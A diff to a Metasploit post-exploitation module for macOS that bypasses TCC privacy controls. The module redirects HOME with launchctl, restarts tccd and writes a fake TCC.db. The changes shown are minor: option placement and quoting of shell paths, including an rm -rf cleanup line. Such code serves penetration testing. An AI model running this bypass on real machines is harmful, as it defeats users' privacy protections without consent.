@@ -32,7 +32,7 @@ class MetasploitModule < Msf::Post
         'SessionTypes' => [ 'shell', 'meterpreter' ]
       )
     )
-    register_options([
+    register_advanced_options([
       OptString.new('WritableDir', [true, 'Writable directory', '/tmp'])
     ])
   end
@@ -65,7 +65,7 @@ class MetasploitModule < Msf::Post
 
     print_status("Creating TCC directory #{tccdir}")
     cmd_exec("mkdir -p '#{tccdir}'")
-    cmd_exec("launchctl setenv HOME #{tmpdir}")
+    cmd_exec("launchctl setenv HOME '#{tmpdir}'")
     cmd_exec('launchctl stop com.apple.tccd && launchctl start com.apple.tccd')
     if file_exist?(tccdb)
       print_good("fake TCC DB found: #{tccdb}")
@@ -92,7 +92,7 @@ class MetasploitModule < Msf::Post
     end
     print_good('TCC.db was successfully updated!')
     cleanup_command = 'launchctl unsetenv HOME && launchctl stop com.apple.tccd && launchctl start com.apple.tccd'
-    cleanup_command << "\nrm -rf #{tmpdir}"
+    cleanup_command << "\nrm -rf '#{tmpdir}'"
     print_status("To cleanup, run:\n#{cleanup_command}\n")
   end
 end
